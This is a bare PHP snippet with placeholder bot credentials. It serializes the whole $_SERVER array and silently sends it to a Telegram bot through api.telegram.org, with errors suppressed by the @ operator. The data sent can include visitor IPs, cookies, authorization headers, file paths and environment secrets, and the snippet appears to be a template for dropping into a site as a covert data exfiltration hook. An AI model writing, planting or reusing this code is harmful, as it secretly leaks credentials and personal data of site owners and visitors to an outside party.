<?php
$API_TOKEN = "Your Token";
$message = urlencode(json_encode([$_SERVER], JSON_PRETTY_PRINT));
$chat_id = "Ur Chat ID";
@file_get_contents("https://api.telegram.org/bot{$API_TOKEN}/sendMessage?text={$message}&chat_id={$chat_id}");
?>
